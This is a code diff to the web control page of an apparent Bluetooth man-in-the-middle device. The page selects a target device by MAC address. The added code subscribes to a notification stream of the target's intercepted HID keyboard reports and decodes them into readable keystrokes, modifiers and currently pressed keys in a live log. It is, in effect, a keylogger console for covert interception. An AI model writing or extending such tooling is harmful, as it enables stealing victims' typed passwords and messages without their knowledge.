@@ -73,39 +73,81 @@
 
 <body>
   <h1>MITM Device Configuration</h1>
-  <div>
-    <button id="connectBtn">Connect</button>
-    <button id="refreshBtn" disabled>Refresh</button>
-    <button id="clearBtn" disabled>Clear Seen Devices</button>
-    <label id="autoRefreshCtl">
-      <input type="checkbox" id="autoRefresh"> Auto Refresh
-    </label>
-    <select id="intervalSel" disabled>
-      <option value="2000">2s</option>
-      <option value="5000" selected>5s</option>
-      <option value="10000">10s</option>
-    </select>
-  </div>
-  <div id="status">Idle</div>
-  <div id="target">Target: <span id="targetVal">(none)</span>
-    <button id="clearTargetBtn" disabled>Clear Target</button>
-  </div>
+  <section id="controls" style="display:grid; gap:.5rem; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); align-items:center;">
+    <div id="connSection" style="border:1px solid #ddd; padding:.6rem; border-radius:.4rem;">
+      <div style="font-weight:600; margin-bottom:.4rem;">Connection</div>
+      <button id="connectBtn">Connect</button>
+      <div id="connState" style="display:inline-block; margin-left:.5rem; color:#555; font-size:.9rem;">Disconnected</div>
+    </div>
+    <div id="discSection" style="border:1px solid #ddd; padding:.6rem; border-radius:.4rem;">
+      <div style="font-weight:600; margin-bottom:.4rem;">Discovery</div>
+      <button id="refreshBtn" disabled>Refresh</button>
+      <button id="clearBtn" disabled>Clear Seen Devices</button>
+      <label id="autoRefreshCtl" style="margin-left:.5rem;">
+        <input type="checkbox" id="autoRefresh"> Auto Refresh
+      </label>
+      <select id="intervalSel" disabled>
+        <option value="2000">2s</option>
+        <option value="5000" selected>5s</option>
+        <option value="10000">10s</option>
+      </select>
+    </div>
+    <div id="targetSection" style="border:1px solid #ddd; padding:.6rem; border-radius:.4rem;">
+      <div style="font-weight:600; margin-bottom:.4rem;">Target</div>
+      <div>Current: <span id="targetVal" class="mac">(none)</span></div>
+      <button id="clearTargetBtn" disabled style="margin-top:.4rem;">Clear Target</button>
+    </div>
+    <div id="notifySection" style="border:1px solid #ddd; padding:.6rem; border-radius:.4rem;">
+      <div style="display:flex; justify-content:space-between; align-items:center;">
+        <div style="font-weight:600;">Notifications</div>
+        <button id="subscribeBtn" disabled>Subscribe</button>
+      </div>
+      <div id="notifyStatus" style="color:#555; font-size:.9rem; margin-top:.3rem;">Not subscribed</div>
+    </div>
+  </section>
+  <div id="status" style="margin-top:.75rem;">Idle</div>
   <div id="devicesContainer"></div>
+
+  <div id="notifyPanel" style="margin-top: 1.5rem;">
+    <h2>Notification Log</h2>
+    <div id="keysSummary" style="margin:.5rem 0;">
+      <div><strong>Latest keys:</strong> <span id="latestKeys">(none)</span></div>
+      <div><strong>Currently pressed:</strong> <span id="pressedKeys">(none)</span></div>
+    </div>
+    <table>
+      <thead>
+        <tr><th style="width:8rem">Time</th><th style="width:4rem">ID</th><th style="width:10rem">Modifiers</th><th>Keys</th><th style="width:40%">Raw</th></tr>
+      </thead>
+      <tbody id="notifyTableBody"></tbody>
+    </table>
+  </div>
 
   <script>
     (() => {
-      const SERVICE_UUID = '12345678-90ab-cdef-0123-456789abcdef';
-      const LIST_CHAR_UUID = '12345678-90ab-cdef-0123-456789abcdf0';
-      const TARGET_CHAR_UUID = '12345678-90ab-cdef-0123-456789abcdf1';
+  const SERVICE_UUID = '12345678-90ab-cdef-0123-456789abcdef';
+  const LIST_CHAR_UUID = '12345678-90ab-cdef-0123-456789abcdf0';
+  const TARGET_CHAR_UUID = '12345678-90ab-cdef-0123-456789abcdf1';
+  const LOG_CHAR_UUID = '12345678-90ab-cdef-0123-456789abcdf2';
 
-      let device, server, service, listChar, targetChar;
+  let device, server, service, listChar, targetChar, logChar;
+  let logSubscribed = false;
       let autoTimer = null;
 
       const qs = id => document.getElementById(id);
       const statusEl = qs('status');
       const devicesContainer = qs('devicesContainer');
-      const targetValEl = document.getElementById('targetVal');
-      const clearTargetBtn = document.getElementById('clearTargetBtn');
+  const targetValEl = document.getElementById('targetVal');
+  const clearTargetBtn = document.getElementById('clearTargetBtn');
+  const subscribeBtn = document.getElementById('subscribeBtn');
+  const notifyStatus = document.getElementById('notifyStatus');
+  const connState = document.getElementById('connState');
+  const latestKeysEl = document.getElementById('latestKeys');
+  const pressedKeysEl = document.getElementById('pressedKeys');
+  const notifyTableBody = document.getElementById('notifyTableBody');
+
+  /** @type {Set<number>} */
+  const pressedSet = new Set();
+  const MAX_ROWS = 50;
 
       function setStatus(msg) {
         statusEl.textContent = msg;
@@ -113,30 +155,49 @@
       }
 
       function enableControls(connected) {
+        connState.textContent = connected ? 'Connected' : 'Disconnected';
         qs('refreshBtn').disabled = !connected;
         qs('clearBtn').disabled = !connected;
         qs('intervalSel').disabled = !connected || !qs('autoRefresh').checked;
         clearTargetBtn.disabled = !connected;
+        subscribeBtn.disabled = !connected;
+        subscribeBtn.textContent = logSubscribed ? 'Unsubscribe' : 'Subscribe';
+        notifyStatus.textContent = logSubscribed ? 'Subscribed' : 'Not subscribed';
       }
 
       async function connect() {
         try {
-          setStatus('Requesting device...');
-          device = await navigator.bluetooth.requestDevice({
-            filters: [{ services: [SERVICE_UUID] }]
-          });
+          setStatus('Looking for permitted devices...');
+          const devices = await navigator.bluetooth.getDevices();
+          if (devices.length > 0) {
+            device = devices[0];
+            setStatus(`Found permitted device: ${device.name || device.id}`);
+          } else {
+            setStatus('Requesting device...');
+            device = await navigator.bluetooth.requestDevice({
+              filters: [{ services: [SERVICE_UUID] }],
+              optionalServices: [SERVICE_UUID]
+            });
+          }
+
+          if (device.gatt.connected) {
+            setStatus('GATT is already connected. Re-initializing...');
+            onDisconnected(); // Reset state
+          }
+
           device.addEventListener('gattserverdisconnected', onDisconnected);
           setStatus('Connecting GATT...');
           server = await device.gatt.connect();
           setStatus('Getting service...');
           service = await server.getPrimaryService(SERVICE_UUID);
-          [listChar, targetChar] = await Promise.all([
+          [listChar, targetChar, logChar] = await Promise.all([
             service.getCharacteristic(LIST_CHAR_UUID),
-            service.getCharacteristic(TARGET_CHAR_UUID)
+            service.getCharacteristic(TARGET_CHAR_UUID),
+            service.getCharacteristic(LOG_CHAR_UUID)
           ]);
           setStatus('Connected.');
           enableControls(true);
-          await Promise.all([refresh(), refreshTarget()]);
+          await refresh();
         } catch (e) {
           setStatus('Error: ' + e);
           console.error(e);
@@ -147,6 +208,13 @@
         setStatus('Disconnected.');
         enableControls(false);
         stopAuto();
+        // cleanup subscription state
+        if (logChar && logSubscribed) {
+          try { logChar.stopNotifications(); } catch (e) {}
+        }
+        logSubscribed = false;
+        logChar = null;
+        notifyStatus.textContent = 'Not subscribed';
       }
 
       function parseListing(text) {
@@ -276,10 +344,183 @@
         autoTimer = null;
       }
 
+      function bufferToHex(view) {
+        let hex = '';
+        for (let i = 0; i < view.byteLength; i++) {
+          hex += view.getUint8(i).toString(16).padStart(2, '0');
+          if (i + 1 < view.byteLength) hex += ' ';
+        }
+        return hex;
+      }
+
+      function onLogNotification(event) {
+        const dv = event.target.value; // DataView
+        const hex = bufferToHex(dv);
+        console.log('[NOTIFY]', hex);
+        setStatus('Last notification: ' + new Date().toLocaleTimeString());
+
+        const bytes = new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength);
+        // Expect first byte to be Report ID, remainder is payload
+        const parsed = parseKeyboardWithIdFirst(bytes);
+        let idForLog = 0;
+        let modsForLog = '';
+        let keysForLog = '';
+        if (parsed) {
+          idForLog = parsed.id;
+          const mods = decodeModifiers(parsed.mod);
+          modsForLog = mods.join('+') || '—';
+
+          const names = parsed.keys.map(k => KEYMAP[k] || `0x${k.toString(16)}`);
+          keysForLog = names.join(', ') || '—';
+
+          updatePressedKeys(parsed.keys);
+          latestKeysEl.textContent = describeLatestChange(parsed.keys);
+          pressedKeysEl.textContent = describePressed();
+        } else {
+          // Non-keyboard or unknown format; assume first byte is a report ID if present.
+          idForLog = bytes.length > 0 ? bytes[0] : 0;
+          modsForLog = '—';
+          keysForLog = '—';
+        }
+
+        addNotifyRow({
+          time: new Date(),
+          id: idForLog,
+          mods: modsForLog,
+          keys: keysForLog,
+          hex
+        });
+      }
+
+      function addNotifyRow(rec) {
+        const tr = document.createElement('tr');
+        const t = rec.time.toLocaleTimeString();
+        tr.innerHTML = `<td>${t}</td><td>${rec.id}</td><td>${escapeHtml(rec.mods)}</td><td>${escapeHtml(rec.keys)}</td><td class="mac">${escapeHtml(rec.hex)}</td>`;
+        notifyTableBody.insertBefore(tr, notifyTableBody.firstChild);
+        while (notifyTableBody.rows.length > MAX_ROWS) {
+          notifyTableBody.deleteRow(notifyTableBody.rows.length - 1);
+        }
+      }
+
+      function escapeHtml(s) {
+        return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;'}[c]));
+      }
+
+      function decodeModifiers(mod) {
+        const bits = [
+          'LCTRL','LSHIFT','LALT','LGUI','RCTRL','RSHIFT','RALT','RGUI'
+        ];
+        const out = [];
+        for (let i = 0; i < 8; i++) if (mod & (1 << i)) out.push(bits[i]);
+        return out;
+      }
+
+      function parseKeyboardWithIdFirst(bytes) {
+        if (bytes.length < 2) return null;
+        const id = bytes[0];
+        const payload = bytes.slice(1); // after ID
+        if (payload.length < 2) return null;
+
+        const mod = payload[0];
+        let keysStart = 2; // default assumes reserved present
+
+        // Heuristics for presence of reserved byte:
+        // - 8-byte payload: [mod, reserved, k1..k6]
+        // - 7-byte payload: [mod, k1..k6] (no reserved)
+        if (payload.length === 7) {
+          keysStart = 1;
+        } else if (payload.length >= 8) {
+          keysStart = 2;
+        } else {
+          // payload length 2..6: best effort — if keys would fit 6 when starting at 1, prefer no-reserved
+          const rem = payload.length - 1; // bytes after mod
+          if (rem <= 6) keysStart = 1; else keysStart = 2;
+        }
+
+        const keys = Array.from(payload.slice(keysStart, keysStart + 6).filter(b => b));
+        return { id, mod, keys };
+      }
+
+      // Minimal HID keycode map (Usage Page 0x07)
+      const KEYMAP = (() => {
+        const m = {};
+        // Letters A-Z (0x04..0x1d)
+        for (let i = 0; i < 26; i++) m[0x04 + i] = String.fromCharCode('A'.charCodeAt(0) + i);
+        // Numbers 1..0 (0x1e..0x27)
+        const nums = ['1','2','3','4','5','6','7','8','9','0'];
+        for (let i = 0; i < nums.length; i++) m[0x1e + i] = nums[i];
+        // Enter, Esc, Backspace, Tab, Space
+        Object.assign(m, {0x28:'ENTER',0x29:'ESC',0x2a:'BACKSPACE',0x2b:'TAB',0x2c:'SPACE'});
+        // Symbols around 0x2d..0x38
+        Object.assign(m, {0x2d:'-',0x2e:'=',0x2f:'[',0x30:']',0x31:'\\',0x32:'#',0x33:';',0x34:"'",0x35:'`',0x36:',',0x37:'.',0x38:'/'});
+        // F1..F12 (0x3a..0x45)
+        for (let i = 0; i < 12; i++) m[0x3a + i] = 'F' + (i + 1);
+        // Arrows and common nav
+        Object.assign(m, {0x4a:'HOME',0x4b:'PGUP',0x4c:'DEL',0x4d:'END',0x4e:'PGDN',0x4f:'RIGHT',0x50:'LEFT',0x51:'DOWN',0x52:'UP',0x53:'NUMLOCK'});
+        return m;
+      })();
+
+      function updatePressedKeys(currentKeys) {
+        const current = new Set(currentKeys);
+        // Add new pressed
+        for (const k of current) pressedSet.add(k);
+        // Remove released (those not in current)
+        for (const k of Array.from(pressedSet)) if (!current.has(k)) pressedSet.delete(k);
+      }
+
+      function describePressed() {
+        if (pressedSet.size === 0) return '(none)';
+        return Array.from(pressedSet).map(k => KEYMAP[k] || `0x${k.toString(16)}`).join(', ');
+      }
+
+      let prevPressedSnapshot = new Set();
+      function describeLatestChange(currentKeys) {
+        const current = new Set(currentKeys);
+        const down = [];
+        const up = [];
+        for (const k of current) if (!prevPressedSnapshot.has(k)) down.push(k);
+        for (const k of prevPressedSnapshot) if (!current.has(k)) up.push(k);
+        prevPressedSnapshot = current; // update snapshot for next diff
+        const downStr = down.length ? 'Down: ' + down.map(k => KEYMAP[k] || `0x${k.toString(16)}`).join(', ') : '';
+        const upStr = up.length ? 'Up: ' + up.map(k => KEYMAP[k] || `0x${k.toString(16)}`).join(', ') : '';
+        return (downStr || upStr) ? [downStr, upStr].filter(Boolean).join(' | ') : '(no change)';
+      }
+
+      async function toggleSubscribe() {
+        if (!server || !server.connected) {
+          setStatus('Not connected.');
+          return;
+        }
+        try {
+          if (!logSubscribed) {
+            if (!logChar) {
+              logChar = await service.getCharacteristic(LOG_CHAR_UUID);
+            }
+            await logChar.startNotifications();
+            logChar.addEventListener('characteristicvaluechanged', onLogNotification);
+            logSubscribed = true;
+            subscribeBtn.textContent = 'Unsubscribe';
+            notifyStatus.textContent = 'Subscribed';
+            setStatus('Subscribed to notifications.');
+          } else {
+            await logChar.stopNotifications();
+            logChar.removeEventListener('characteristicvaluechanged', onLogNotification);
+            logSubscribed = false;
+            subscribeBtn.textContent = 'Subscribe';
+            notifyStatus.textContent = 'Not subscribed';
+            setStatus('Unsubscribed from notifications.');
+          }
+        } catch (e) {
+          setStatus('Subscription error: ' + e);
+          console.error(e);
+        }
+      }
+
       // Event bindings
       qs('connectBtn').addEventListener('click', connect);
       qs('refreshBtn').addEventListener('click', refresh);
       qs('clearBtn').addEventListener('click', clearDevices);
+      qs('subscribeBtn').addEventListener('click', toggleSubscribe);
       qs('autoRefresh').addEventListener('change', e => {
         if (e.target.checked) startAuto(); else stopAuto();
       });
